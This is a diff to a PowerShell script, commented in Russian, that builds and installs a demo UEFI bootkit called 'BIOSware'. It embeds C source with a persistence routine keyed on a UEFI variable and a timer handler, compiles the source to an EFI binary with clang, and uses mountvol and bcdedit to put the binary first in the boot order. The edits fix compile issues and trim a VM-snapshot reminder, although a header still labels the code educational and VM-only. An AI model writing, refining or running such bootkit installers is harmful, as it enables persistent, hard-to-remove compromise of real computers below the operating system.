@@ -1,6 +1,7 @@
 #Requires -RunAsAdministrator
 <#
-
+    BIOSware UEFI Bootkit DEMO + 16 МБ chunks
+    ТОЛЬКО ДЛЯ УЧЕБНЫХ ЦЕЛЕЙ В ВМ!
 #>
 
 $sourceCode = @'
@@ -48,7 +49,7 @@ VOID EFIAPI TimerHandler(IN EFI_EVENT Event, IN VOID *Context)
     }
 }
 
-// ==================== ДЕМОНСТРАЦИЯ РАЗДЕЛЕНИЯ ДИСКА ====================
+// ==================== ДЕМОНСТРАЦИЯ 16 МБ ЧАНКОВ ====================
 VOID DemonstrateDiskChunks(VOID)
 {
     EFI_STATUS Status;
@@ -112,10 +113,13 @@ EFI_STATUS InstallPersistence(VOID)
 
 EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
 {
-    InitializeLib(ImageHandle, SystemTable);
+    gST = SystemTable;
+    gBS = SystemTable->BootServices;
+    gRT = SystemTable->RuntimeServices;
+
     Print(L"\n[+] BIOSware UEFI Bootkit DEMO\n");
 
-    UINT32 DataSize = 0;
+    UINTN DataSize = 0;
     if (gRT->GetVariable(L"BIOSware_Active", &gEfiGlobalVariableGuid, NULL, &DataSize, NULL) == EFI_NOT_FOUND) {
         InstallPersistence();
     }
@@ -150,11 +154,6 @@ function Install-Clang {
     }
 
     Start-Sleep -Seconds 3
-    if (Get-Command clang -ErrorAction SilentlyContinue) {
-        Write-Host "[+] Clang успешно установлен!" -ForegroundColor Green
-    } else {
-        Write-Host "[-] Перезапустите PowerShell от администратора" -ForegroundColor Yellow
-    }
 }
 
 function Get-UefiHeaders {
@@ -211,7 +210,7 @@ function Install-Bootkit {
     bcdedit /displayorder $guid /addfirst
 
     mountvol X: /D
-    Write-Host "[+] Bootkit установлен! Перезагрузи VM после снапшота." -ForegroundColor Green
+    Write-Host "[+] Bootkit установлен!" -ForegroundColor Green
 }
 
 # ============================================================
@@ -223,4 +222,4 @@ $sourceCode | Out-File $tempC -Encoding utf8 -Force
 $efi = Compile-Efi -SourceFile $tempC
 Install-Bootkit -EfiFile $efi
 
-Write-Host "`nГотово!" -ForegroundColor Green
+Write-Host "`nГотово! Сделай снапшот и перезагружай ВМ." -ForegroundColor Green
